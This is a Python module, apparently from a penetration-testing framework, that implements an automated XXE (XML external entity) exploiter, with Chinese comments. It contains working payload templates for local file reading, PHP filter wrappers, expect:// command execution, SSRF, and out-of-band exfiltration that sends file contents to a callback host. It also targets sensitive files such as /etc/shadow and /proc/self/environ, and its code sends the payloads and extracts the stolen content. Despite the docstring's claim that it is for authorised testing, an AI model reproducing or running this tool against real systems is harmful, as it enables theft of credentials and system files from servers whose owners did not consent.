#!/usr/bin/env python3
"""
XXE 利用器 - XML外部实体注入漏洞利用

支持场景:
- 文件读取 (本地文件泄露)
- SSRF (内网探测)
- DoS (实体膨胀攻击)
- 数据外带 (OOB XXE)

警告: 本工具仅用于授权安全测试
"""

import logging
import re
import time
from typing import Any, Dict, List, Optional

from ..engine import (
    BaseExploiter,
    ExploitResult,
    ExploitStatus,
    ExploitType,
    FileInfo,
    register_exploiter,
)

logger = logging.getLogger(__name__)


@register_exploiter(["xxe", "xml_injection"])
class XXEExploiter(BaseExploiter):
    """XML外部实体注入利用器"""

    name = "xxe_exploiter"
    supported_vuln_types = ["xxe", "xml_injection"]
    exploit_type = ExploitType.FILE_READ

    # XXE Payload模板
    XXE_PAYLOADS = {
        "file_read": {
            "basic": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{{FILE}}">
]>
<root>&xxe;</root>""",
            "parameter_entity": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file://{{FILE}}">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{{CALLBACK}}/?data=%file;'>">
  %eval;
  %exfil;
]>
<root>test</root>""",
            "php_wrapper": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={{FILE}}">
]>
<root>&xxe;</root>""",
            "expect": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://{{CMD}}">
]>
<root>&xxe;</root>""",
        },
        "ssrf": {
            "internal": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{{URL}}">
]>
<root>&xxe;</root>""",
        },
        "oob": {
            "dns": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{{DOMAIN}}/xxe">
  %xxe;
]>
<root>test</root>""",
            "http": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file://{{FILE}}">
  <!ENTITY % dtd SYSTEM "http://{{CALLBACK}}/xxe.dtd">
  %dtd;
]>
<root>&send;</root>""",
        },
    }

    # 目标文件列表
    TARGET_FILES = {
        "unix": [
            "/etc/passwd",
            "/etc/hosts",
            "/etc/shadow",
            "/etc/group",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
        ],
        "windows": [
            "C:/Windows/win.ini",
            "C:/Windows/system.ini",
            "C:/Windows/System32/drivers/etc/hosts",
            "C:/inetpub/wwwroot/web.config",
        ],
    }

    # 文件内容特征
    FILE_SIGNATURES = {
        "/etc/passwd": r"root:[x*]?:\d+:\d+:",
        "/etc/hosts": r"127\.0\.0\.1\s+localhost",
        "/etc/shadow": r"root:\$[0-9a-z]+\$",
        "/etc/group": r"root:[x*]?:0:",
        "win.ini": r"\[fonts\]|\[extensions\]",
        "system.ini": r"\[boot\]|\[drivers\]",
        "hosts": r"127\.0\.0\.1\s+localhost",
    }

    def exploit(
        self, detection_result: Any, targets: Optional[Dict[str, Any]] = None, **kwargs
    ) -> ExploitResult:
        """
        执行XXE利用

        Args:
            detection_result: 漏洞检测结果
            targets: 利用目标配置
                - files: 要读取的文件列表
                - os_type: 目标操作系统
                - use_oob: 是否使用OOB技术
        """
        start_time = time.time()

        # 提取检测信息
        url = getattr(detection_result, "url", "")
        param = getattr(detection_result, "param", "")
        payload = getattr(detection_result, "payload", "")
        extra = getattr(detection_result, "extra", {}) or {}

        if not url:
            return self._create_result(
                status=ExploitStatus.NOT_APPLICABLE, vuln_type="xxe", url=url, error="缺少URL信息"
            )

        # 获取配置
        targets = targets or {}
        os_type = extra.get("os_type", "unix")
        timeout = targets.get("timeout", 30)
        content_type = extra.get("content_type", "application/xml")

        # 获取目标文件列表
        target_files = targets.get("files", {}).get(os_type, self.TARGET_FILES.get(os_type, []))

        logger.info(f"[XXEExploiter] 开始利用 URL={url}, OS={os_type}")

        # 尝试文件读取
        read_files = []
        for file_path in target_files[:5]:  # 限制数量
            result = self._try_file_read(url, file_path, content_type, timeout)
            if result["success"]:
                read_files.append(
                    FileInfo(
                        path=file_path,
                        content=result["content"][:5000],
                        size=len(result["content"]),
                        file_type=self._detect_file_type(file_path),
                    )
                )
                logger.info(f"[XXEExploiter] 文件读取成功: {file_path}")

        execution_time = (time.time() - start_time) * 1000

        if read_files:
            return self._create_result(
                status=ExploitStatus.SUCCESS,
                vuln_type="xxe",
                url=url,
                files=read_files,
                data={
                    "files_read": [f.path for f in read_files],
                    "total_size": sum(f.size for f in read_files),
                },
                evidence=f"成功读取 {len(read_files)} 个文件",
                execution_time_ms=execution_time,
                metadata={
                    "os_type": os_type,
                    "content_type": content_type,
                },
            )
        else:
            return self._create_result(
                status=ExploitStatus.FAILED,
                vuln_type="xxe",
                url=url,
                error="XXE文件读取失败",
                execution_time_ms=execution_time,
                metadata={"os_type": os_type},
            )

    def _try_file_read(
        self, url: str, file_path: str, content_type: str, timeout: int
    ) -> Dict[str, Any]:
        """尝试读取文件"""
        payloads_to_try = [
            self.XXE_PAYLOADS["file_read"]["basic"],
            self.XXE_PAYLOADS["file_read"]["php_wrapper"],
        ]

        for payload_template in payloads_to_try:
            payload = payload_template.replace("{{FILE}}", file_path)

            # 使用统一的HTTP客户端
            result = self.exploit_http.send_xml_request(url, payload, timeout, content_type)
            if result["success"]:
                content = self._extract_file_content(result["response"], file_path)
                if content:
                    return {"success": True, "content": content}

        return {"success": False}

    def _extract_file_content(self, response: str, file_path: str) -> Optional[str]:
        """从响应中提取文件内容"""
        if not response:
            return None

        # 检查文件特征
        file_name = file_path.split("/")[-1].split("\\")[-1].lower()

        for pattern_file, pattern in self.FILE_SIGNATURES.items():
            if pattern_file in file_path.lower() or pattern_file in file_name:
                match = re.search(pattern, response, re.IGNORECASE)
                if match:
                    # 提取更多上下文
                    start = max(0, match.start() - 100)
                    end = min(len(response), match.end() + 500)
                    return response[start:end]

        # 检查base64编码的内容 (PHP wrapper)
        base64_pattern = r"[A-Za-z0-9+/]{50,}={0,2}"
        match = re.search(base64_pattern, response)
        if match:
            try:
                import base64

                decoded = base64.b64decode(match.group(0)).decode("utf-8", errors="ignore")
                if len(decoded) > 10:
                    return decoded
            except (ValueError, TypeError, UnicodeDecodeError):
                pass

        # 通用检测
        if file_path.endswith("passwd") and "root:" in response:
            return response

        if "win.ini" in file_path.lower() and "[fonts]" in response.lower():
            return response

        return None

    def _detect_file_type(self, file_path: str) -> str:
        """检测文件类型"""
        ext = file_path.split(".")[-1].lower() if "." in file_path else ""

        type_map = {
            "ini": "config",
            "conf": "config",
            "config": "config",
            "xml": "xml",
            "json": "json",
            "log": "log",
            "txt": "text",
            "sh": "script",
            "py": "script",
            "php": "script",
        }

        if ext in type_map:
            return type_map[ext]

        # 特殊文件
        if "passwd" in file_path or "shadow" in file_path:
            return "system"
        if "hosts" in file_path:
            return "network"
        if "environ" in file_path or "cmdline" in file_path:
            return "process"

        return "unknown"


def register_xxe_exploiter():
    """注册XXE利用器"""
    return XXEExploiter
